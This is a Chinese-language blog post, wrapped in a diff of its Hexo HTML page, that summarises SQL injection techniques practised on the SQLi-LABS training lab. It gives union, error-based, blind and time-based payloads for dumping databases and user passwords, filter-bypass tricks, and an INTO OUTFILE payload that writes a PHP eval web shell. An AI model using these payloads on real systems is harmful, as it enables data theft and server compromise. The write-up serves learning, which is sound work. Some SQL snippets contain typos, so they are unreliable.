@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="SQLi-LABS LESS-1~28a绕过姿势小结感悟：&amp;emsp;&amp;emsp;上一篇对28a及之前的关卡做理论小结的时候就想好再写一篇绕过方式小结，这也是为了方便以后忘记的时候能想起来（虽然不一定写的完整），如果有什么错误，还请各位大表哥大表姐能指条明路。上一次小结中只是单纯的介绍了一下注入漏洞的分类和利用方法，但是不是和具体，这个会在这章补充，而且不写漏洞的危害主要是因为SQL注入是WEB漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi-LABS LESS-1~28a绕过姿势小结">
+<meta property="og:url" content="http://yoursite.com/2018/12/11/SQLi-LABS-LESS-1-28a绕过姿势小结/index.html">
+<meta property="og:site_name" content="Water Cloud">
+<meta property="og:description" content="SQLi-LABS LESS-1~28a绕过姿势小结感悟：&amp;emsp;&amp;emsp;上一篇对28a及之前的关卡做理论小结的时候就想好再写一篇绕过方式小结，这也是为了方便以后忘记的时候能想起来（虽然不一定写的完整），如果有什么错误，还请各位大表哥大表姐能指条明路。上一次小结中只是单纯的介绍了一下注入漏洞的分类和利用方法，但是不是和具体，这个会在这章补充，而且不写漏洞的危害主要是因为SQL注入是WEB漏">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-12-11T04:43:17.769Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQLi-LABS LESS-1~28a绕过姿势小结">
+<meta name="twitter:description" content="SQLi-LABS LESS-1~28a绕过姿势小结感悟：&amp;emsp;&amp;emsp;上一篇对28a及之前的关卡做理论小结的时候就想好再写一篇绕过方式小结，这也是为了方便以后忘记的时候能想起来（虽然不一定写的完整），如果有什么错误，还请各位大表哥大表姐能指条明路。上一次小结中只是单纯的介绍了一下注入漏洞的分类和利用方法，但是不是和具体，这个会在这章补充，而且不写漏洞的危害主要是因为SQL注入是WEB漏">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/12/11/SQLi-LABS-LESS-1-28a绕过姿势小结/">
+
+
+
+
+
+  <title>SQLi-LABS LESS-1~28a绕过姿势小结 | Water Cloud</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Water Cloud</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-favorite">
+          <a href="/favorite/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heart"></i> <br>
+            
+            favorite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            Schedule
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/11/SQLi-LABS-LESS-1-28a绕过姿势小结/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Water Cloud">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Water Cloud">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQLi-LABS LESS-1~28a绕过姿势小结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-11T12:42:41+08:00">
+                2018-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SQLi-LABS-LESS-1-28a绕过姿势小结"><a href="#SQLi-LABS-LESS-1-28a绕过姿势小结" class="headerlink" title="SQLi-LABS LESS-1~28a绕过姿势小结"></a>SQLi-LABS LESS-1~28a绕过姿势小结</h1><h3 id="感悟："><a href="#感悟：" class="headerlink" title="感悟："></a>感悟：</h3><p>&emsp;&emsp;上一篇对28a及之前的关卡做<a href="https://shuishangyun.github.io/2018/11/30/SQLI-LABS注入小结（Less-1～Less-28a）" target="_blank" rel="noopener">理论小结</a>的时候就想好再写一篇绕过方式小结，这也是为了方便以后忘记的时候能想起来（虽然不一定写的完整），如果有什么错误，还请各位大表哥大表姐能指条明路。上一次小结中只是单纯的介绍了一下注入漏洞的分类和利用方法，但是不是和具体，这个会在这章补充，而且不写漏洞的危害主要是因为SQL注入是WEB漏洞中能排进前三的漏洞，简直就是一大威胁，这个应该是了解注入之前就该了解的，没必要在我这重复一遍。好了，多的废话也不想讲了，还是进入正题的好。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文:"></a>正文:</h3><hr>
+<p>&emsp;&emsp;在正式记录SQL注入过程之前，在这里要先介绍几个SQL常用语法和PHP接收及处理变量的常用语法。</p>
+<h6 id="SQL语法："><a href="#SQL语法：" class="headerlink" title="SQL语法："></a>SQL语法：</h6><ol>
+<li><p>增：</p>
+<ul>
+<li>插入元组：<code>insert into &lt;已有的新表&gt; values([列名&lt;约束条件&gt;],[列名&lt;约束条件&gt;],······),([列名&lt;约束条件&gt;],[列名&lt;约束条件&gt;],······),···</code></li>
+<li>复制表数据：<code>insert into &lt;已有的新表&gt; (列名) select &lt;原表列名&gt; from &lt;原表名&gt;</code></li>
+<li>导入数据至新建表：<code>select &lt;新建表列名&gt; into &lt;新建表名&gt; from &lt;原表名&gt;</code></li>
+<li>Union 插入多元组：<code>insert &lt;表名&gt; &lt;列名&gt; select &lt;列值&gt; tnion select &lt;列值&gt;</code></li>
+</ul>
+</li>
+<li><p>删：</p>
+<ul>
+<li>删列值：<code>delete from &lt;表名&gt; [where &lt;删除条件&gt;]</code></li>
+<li>删表：<code>drop table &lt;表名&gt;</code></li>
+</ul>
+</li>
+<li><p>改：</p>
+<ul>
+<li><code>update &lt;表名&gt; set &lt;列名=更新值&gt; [where &lt;更新条件&gt;]</code></li>
+</ul>
+</li>
+<li><p>查：</p>
+<ul>
+<li><p>条件查询：<code>select &lt;列名&gt; from &lt;表名&gt; [where &lt;查询条件表达试&gt;[order by &lt;排序的列名&gt;[asc或desc]</code></p>
+</li>
+<li><p>标记查询：<code>select &lt;列名&gt;, &lt;标识&gt; as &lt;标识名&gt; from &lt;表名&gt;</code><!--有逗号表示新建列（虚表内），没逗号表示修改列名--></p>
+</li>
+<li><p>关键字查询：<code>select top &lt;数值&gt; &lt;列名&gt; from &lt;表名&gt;</code> 查询前指定行</p>
+<p><code>select top &lt;数值&gt; percent &lt;列名&gt; from &lt;表名&gt;</code>查询前指定百分比</p>
+</li>
+</ul>
+</li>
+<li><p>排序：<code>order by[列名]</code>用于对指定列排序，<code>group by[列名]</code>对指定列进行分组排序</p>
+</li>
+<li><p>子查询：<code>select &lt;列名&gt; from &lt;表名1&gt; where &lt;约束条件1&gt;[select &lt;列名&gt; from &lt;表名2&gt; where &lt;约束条件2&gt;]</code></p>
+</li>
+<li><p>联合查询：<code>select * from &lt;表名1&gt; union select * from &lt;表名2&gt;</code></p>
+</li>
+<li><p>连接查询：</p>
+<ul>
+<li><p>内连接：</p>
+<p><code>select &lt;列名&gt; from &lt;表a&gt;,&lt;表b&gt; where &lt;表a&gt;.&lt;列名&gt;=&lt;表b&gt;.&lt;列名&gt;</code></p>
+<p><code>select &lt;列名&gt; from &lt;表a&gt; inner jion &lt;表b&gt; on (&lt;表a&gt;.&lt;列名&gt;=&lt;表b&gt;.&lt;列名&gt;)</code></p>
+</li>
+<li><p>外连接：</p>
+<p><code>select &lt;列名0&gt; from &lt;表名1&gt; as &lt;别名1&gt; left outer jion &lt;表名2&gt; as &lt;别名2&gt; on &lt;别名1&gt;.&lt;列名&gt;=&lt;别名2&gt;.&lt;列名&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><p>约束条件：<code>and,or,&gt;,&lt;,=,&lt;&gt;,!=,like,between and,jion in,in,not,having</code></p>
+</li>
+<li><p>注释符：<code>#,--,/**/,/xxx/,/!xxx/</code></p>
+</li>
+</ol>
+<h6 id="PHP函数："><a href="#PHP函数：" class="headerlink" title="PHP函数："></a>PHP函数：</h6><p>&emsp;&emsp;函数全部来自sqli-labs前28a关卡的index.php文件：</p>
+<p>&emsp;&emsp;<code>include($file)</code>函数将 PHP 文件的内容插入另一个 PHP 文件;</p>
+<p>&emsp;&emsp;<code>isset($_GET[&#39;id&#39;])</code>用于判断是否存在该变量；</p>
+<p>&emsp;&emsp;<code>$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);</code>将URL传过来的ID值存入result.txt中；</p>
+<p>&emsp;&emsp;<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code>为sql语句，也是注入的关键；</p>
+<p>&emsp;&emsp;<code>$result=mysql_query($sql);</code>执行一条sql语句，执行成功返回true，失败返回false，保留缓存；</p>
+<p>&emsp;&emsp;<code>$row = mysql_fetch_array($result);</code>从结果集中取得一行作为关联数组，或数字数组，或二者兼有，返回根据从结果集取得的行生成数组，如果没有更多行则返回 false；</p>
+<p>&emsp;&emsp;<code>mysql_error()</code>返回上一个 MySQL 操作产生的文本错误信息；</p>
+<p>&emsp;&emsp;<code>check_input()</code>文件内自定义函数，主要用来过滤特殊字符，基本限定所有直接绕过方式，具体内容解释如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">	<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">        $value = stripslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// Quote if not a number</span></span><br><span class="line">	<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">    &#123;</span><br><span class="line">        $value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;<code>empty($value)</code> 函数用于检查一个变量是否为空；</p>
+<p>&emsp;&emsp;<code>substr($str,$begin,$length)</code>函数取字符串子串，第一个参数为主字符串，第二个参数为主字符串中截取子串开始的位置，第三个参数为截取子串的长度；</p>
+<p>&emsp;&emsp;<code>get_magic_quotes_gpc()</code>函数取得 PHP 环境变数 magic_quotes_gpc 的值，返回 0 表示关闭本功能，返回 1 表示本功能打开。当 magic_quotes_gpc 打开时，所有的 ‘ (单引号), ” (双引号), (反斜线) and 空字符会自动转义为含有反斜线的溢出字符。</p>
+<p>&emsp;&emsp;<code>stripslashes($str)</code>函数删除反斜杠；</p>
+<p>&emsp;&emsp;<code>ctype_digit($str)</code>函数检测字符串中的字符是否都是数字，负数和小数会检测不通过。 注意，参数一定要是字符串，如果不是字符串，则会返回0/FASLE。</p>
+<p>&emsp;&emsp;<code>mysql_real_escape_string($value,$connection)</code>函数转义 SQL 语句中使用的字符串中的特殊字符。受影响的字符有<code>\x00</code>,<code>\n</code>,<code>\r</code>,<code>\</code>,<code>&#39;</code>,<code>&quot;</code>,<code>\x1a</code>;</p>
+<p>&emsp;&emsp;<code>intval(mixed $var,int $base = xx)</code>函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 整数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p>
+<p>&emsp;&emsp;<code>$timestamp = time() + 3600; date($format, $timestamp)</code>time()函数返回当前时间的 Unix 时间戳，并格式化为日期。date()函数对时间进行格式化，format为格式，timestamp为规定时间戳。</p>
+<p>&emsp;&emsp;<code>base64_decode($cookee);</code>函数对参数进行base64解密。</p>
+<p>&emsp;&emsp;<code>setcookie(name,value,expire,path,domain,secure)</code>函数向客户端发送一个 HTTP cookie。必须在任何其他输出发送前对 cookie 进行赋值。如果成功，则该函数返回 true，否则返回 false。</p>
+<p>&emsp;&emsp;<code>header(string,replace,http_response_code)</code>函数向客户端发送原始的 HTTP 报头。</p>
+<p>&emsp;&emsp;<code>session_start();</code>函数会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。 </p>
+<p>&emsp;&emsp;<code>mysql_escape_string ( string unescaped_string )</code>函数将 unescaped_string 转义，但并不转义 % 和 _。</p>
+<p>&emsp;&emsp;<code>alert()</code> 函数用于显示带有一条指定消息和一个 OK 按钮的警告框。</p>
+<p>&emsp;&emsp;<code>mysql_affected_rows()</code>函数返回前一次 MySQL 操作所影响的记录行数。</p>
+<p>&emsp;&emsp;<code>blacklist($id)</code>为自定义函数，主要用到<code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code>函数，该函数执行一个正则表达式的搜索和替换，如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。多字符过滤。</p>
+<h6 id="MYSQL五类报错注入函数："><a href="#MYSQL五类报错注入函数：" class="headerlink" title="MYSQL五类报错注入函数："></a>MYSQL五类报错注入函数：</h6><ol>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1. floor()：取整函数，打开MySQL命令框输入命令查看报错信息。</span><br><span class="line">select count(*) from infomation_schema.tables group by concat((select database()),floor(rand(0)*2);</span><br><span class="line">2. extractvalue()：接收两个参数，第一个XML文档，第二个xpath语句。xpath语句格式错误返回数据。</span><br><span class="line">select extractvalue(1,concat(0x7e,(select database()),0x7e));</span><br><span class="line">3. updatexml()：查询出所有库以及库中所有表的信息。</span><br><span class="line">select updatexml(1,concat(0x7e,(select database()),0x7e,1);</span><br><span class="line">4. exp()：返回e(自然对数的底)指数X的幂值。</span><br><span class="line">select EXP(~(SELECT * from(select database())a));</span><br><span class="line">5. 六个同类空间索引函数：</span><br><span class="line">   - GeometryCollection()：零个或更多个 geometry 或 geography 实例的集合。</span><br><span class="line">   select GeometryCollection((select * from (select * from(select user())a)b));</span><br><span class="line">   - polygon()：存储为一系列点的二维表面，这些点定义一个外部边界环和零个或多个内部环。</span><br><span class="line">   select polygon((select * from(select * from(select user())a)b));</span><br><span class="line">   - multipoint()：零个点或更多个点的集合。</span><br><span class="line">   select multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">   - multilinestring()：零个或更多 geometry 或 geography LineString 实例的集合。</span><br><span class="line">   select multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line">   - linestring()：一个一维对象，表示一系列点和连接这些点的线段。</span><br><span class="line">   select LINESTRING((select * from(select * from(select user())a)b));</span><br><span class="line">   - multipolygon()：零个或更多个 Polygon 实例的集合。</span><br><span class="line">   select multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<p>&emsp;&emsp;语法不是一成不变的，有时候灵活贯通才是最重要的，接下来记录常见SQL注入姿势：</p>
+<ol>
+<li><h6 id="普通注入："><a href="#普通注入：" class="headerlink" title="普通注入："></a>普通注入：</h6><p>这一类注入是最基础且最核心的注入，过程也已经公式化了：</p>
+<p>1）判断注入点：<code>&#39;,&quot;,无，),&#39;),&quot;)</code>等，接<code>or 1=1</code>和<code>or 1=2</code>，根据返回判断，恒等式成立表示成功，矛盾等式成立表示错误，最后面用注释符。</p>
+<p>2）判断字段个数：<code>order by i #</code>，i 为自然数，列存在则返回正常界面，不存在返回错误界面。例，当列的个数为4时，i从1到4都会返回正常界面，i 为5及5之后的时候，会返回错误信息，由此可判断，数据库中当前正在使用的表有4 个字段（列）。这里假设有4个字段。</p>
+<p>3）判断显位：<code>union select 1,2,3,4 #</code>显位会将界面中值所在的字段显示出来。例，表中原本是显示“test”的地方现在显示2，说明“test”所在的字段会在界面中显示，而且是显示在2的位置。判断显位的主要目的是为了在构造查询语句的时候明白要把查询的值放在哪个字段。这里假设显位为2，3。</p>
+<p>4）爆库名：<code>union select 1,schema_name,3,4 from information_schema.schemata limit 0,1 #</code>或<code>union select 1,group_concat(schema_name),3,4 from information_schema.schemata#</code>或<code>union select 1,database(),3,4 #</code>第一种是手工逐个爆出数据库名，通过修改limit后面的第一个参数，回显不同的数据库；第二种是利用group_concat()将数据库成组爆出，用逗号隔开；第三种是利用database()方法直接爆出当前正在使用的数据库名（只有一个）。这里假设库名为“security”。</p>
+<p>5）爆表名：<code>union select 1,table_name,3,4 from information_schema.tables where table_schema=&#39;security&#39; limit 0,1#</code>或<code>union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() #</code>或<code>union select 1,user(),3,4 #</code>第一种是手工逐个爆出表名，通过修改limit后面的第一个参数，回显不同的表；第二种是利用group_concat()将表成组爆出，用逗号隔开；第三种是利用user()方法直接爆出当前正在使用的表名（只有一个）。这里假设表名为“users”。</p>
+<p>6）爆字段名：<code>union select 1,column_name,3,4 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1 #</code>或<code>union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=user() #</code>第一种是手工逐个爆出字段名，通过修改limit后面的第一个参数，回显不同的字段；第二种是利用group_concat()将字段成组爆出，用逗号隔开。这里假设字段名为id，username，password，is_admin。</p>
+<p>7）爆元组值：<code>union select 1,username,password,4 from security.users limit 0,1 #</code>或<code>union select 1,group_concat(username),group_concat(password),4 from users#</code>第一种是手工逐个爆出元组值，通过修改limit后面的第一个参数，回显不同的元组值；第二种是利用group_concat()将元组值成组爆出，用逗号隔开。元组值就是最后的目标。</p>
+<p>==下面的(select)表示普通注入4)到7)。。。。。==</p>
+</li>
+<li><h6 id="双注入："><a href="#双注入：" class="headerlink" title="双注入："></a>双注入：</h6><p>双注入是在普通注入的基础上再加一成注入条件，主要是利用mysql虚拟表报错。注入点，字段数，和显位的判断与普通注入相似。这里假设有3个字段，显位为2，3。</p>
+<p>爆内容格式：<code>union select 1,count(*),concat((select),floor(rand()*2)) as a from information_schema.tables group by a #</code>或<code>union select 1,count(*),count(*) from information_schema.tables group by concat((select),floor(rand()*2)) #</code>，这里的select语句不能用到group_concat()，会和前面的concat()冲突。</p>
+</li>
+<li><h6 id="SQL盲注："><a href="#SQL盲注：" class="headerlink" title="SQL盲注："></a>SQL盲注：</h6><p>1）布尔盲注：</p>
+<ul>
+<li><p>判断长度：<code>and length(select)&gt;n #</code>，n为自然数，也就是长度，回显出现明显不一样的时候。</p>
+<p>length($str)方法返回字符串长度。</p>
+</li>
+<li><p>判断内容：<code>and ascii(substr((select),i,1))&gt;n #</code>这里的i和n为自然数，i表示字符下标，n用于判断字符的ASCII码值，也可以写成<code>and substr((select),1,j)=&#39;$str&#39;#</code>，这里j为要截取的字符串长度，一般从1开始，一直到字符串结束，$str不固定，可以一个一个字符判断组成。</p>
+<p>sacii($str)方法将字符串转换为ascii码。</p>
+<p>substr($str,i,j)方法从str中的第i位开始提取j个字符。</p>
+</li>
+</ul>
+<p>2）时间盲注：</p>
+<ul>
+<li><p>判断内容：<code>and if(ascii(substr((select),i,1))&gt;n,1,sleep(3)) #</code>这里的i和n为自然数，i表示字符下标，n用于判断字符的ASCII码值，同理这里也可以写成<code>and if(substr((select),1,j)=&#39;$str&#39;,1,sleep(3))#</code>，这里j为要截取的字符串长度，一般从1开始，一直到字符串结束，$str不固定，可以一个一个字符判断组成。</p>
+<p>if(example, true,false)条件判断，当true!=0&amp;&amp;true!=NULL时返回true，否则返回false。</p>
+<p>sleep(3)延迟输出，这里延迟时间3秒。</p>
+</li>
+</ul>
+<p>3）报错盲注：</p>
+<ul>
+<li><p>直接语句注入，即双注入。</p>
+</li>
+<li><p>xpath函数注入：<code>and extractvalue(1,concat(0x7e,(select),0x73)) #</code>或<code>and updatexml(1,concat(0x7e,(select),0x7e),1) #</code>或<code>and EXP(~(SELECT * from(select )a)) #</code>或mysql六大空间图形索引函数。</p>
+<p>extractvalue($xml-document,xml-path) :对XML文档进行查询的函数，第二个参数xml-path是xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果写入其他格式，就会报错，并且会返回写入的非法格式内容。</p>
+<p>updatexml($xml-documet,xml-path,update-content)方法更新xml文档，利用原理同上。</p>
+</li>
+<li><p>重复性报错：<code>union select 1,2,3 from (select name_const((select),1),name_const((select),1))x #</code>(select)语句必须一样，x为别名。</p>
+<p>name_const(name,value) 返回给定值。 当用来产生一个结果集合列时, name_const()促使该列使用给定名称。</p>
+</li>
+</ul>
+</li>
+<li><p>文件导入导出：</p>
+<ul>
+<li><p><code>load_file()</code>:<code>union select 1,2,load_file(&#39;c:\\xxx\..\xxx.xxx&#39;)</code></p>
+<p>load_file()：读取文件并返回文件内容为字符串，使用有<a href="https://shuishangyun.github.io/2018/11/30/SQLI-LABS注入小结（Less-1～Less-28a）/#more" target="_blank" rel="noopener">前提</a>，参考文件导入导出。</p>
+</li>
+<li><p>目标文件不存在采用<code>SELECT...INTO OUTFILE</code>：<code>select &lt;?php @eval($_POST[&#39;sb&#39;])?&gt; into outfile &quot;C:\\xxx\..\xxx.php&quot;</code>，该例子在c盘选定目录下新建xxx.php文件，并将一句话木马内容<code>&lt;?php @eval($_POST[&#39;sb&#39;])?&gt;</code>写入文件。</p>
+</li>
+<li><p>当然，这两个方法可以同时使用：<code>union select 1,2,(select load_file(&#39;C:\\xxx\..\xxx.php&#39;)) into outfile &quot;C:\\xxx\..\xxx.php&quot;</code>。</p>
+</li>
+</ul>
+</li>
+<li><p>字符串过滤：</p>
+<ul>
+<li><p>注释符被过滤可以采用其他等价形式的注释符绕过，常用注释符：<code>//，，– ，=，/**/，#，–+，– -，;，%00，–a，&amp;&amp;，||，空格</code></p>
+<p>例：空格被过滤：<code>union/**/select/**/1,2,3/**/from/**/usrs/**/where/**/1/**/#</code></p>
+</li>
+<li><p>常用字符串被过滤可以用大小写或双拼写绕过，常用字符串：<code>union，select，and，or，password，oder，where，like</code></p>
+<p>例：union的大小写都被过滤：<code>uniUNIONon</code>代替</p>
+</li>
+</ul>
+</li>
+</ol>
+<p>&emsp;&emsp;目前能回想起来的大概就这么多，还有一些更深层次和零零碎碎的留至以后想起来的时候补充。如果有什么错误或不完善的地方，欢迎表哥表姐们指教。交友通道：2790169067</p>
+<p>参考文献：</p>
+<p><a href="https://www.cnblogs.com/Dleo/p/5493782.html" target="_blank" rel="noopener">https://www.cnblogs.com/Dleo/p/5493782.html</a></p>
+<p><a href="http://www.runoob.com/php/php-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/php/php-tutorial.html</a></p>
+<p><a href="https://www.cnblogs.com/daxueshan/p/6687521.html" target="_blank" rel="noopener">https://www.cnblogs.com/daxueshan/p/6687521.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/30/SQLI-LABS注入小结（Less-1～Less-28a）/" rel="next" title="SQLI-LABS注入小结（Less-1～Less-28a）">
+                <i class="fa fa-chevron-left"></i> SQLI-LABS注入小结（Less-1～Less-28a）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
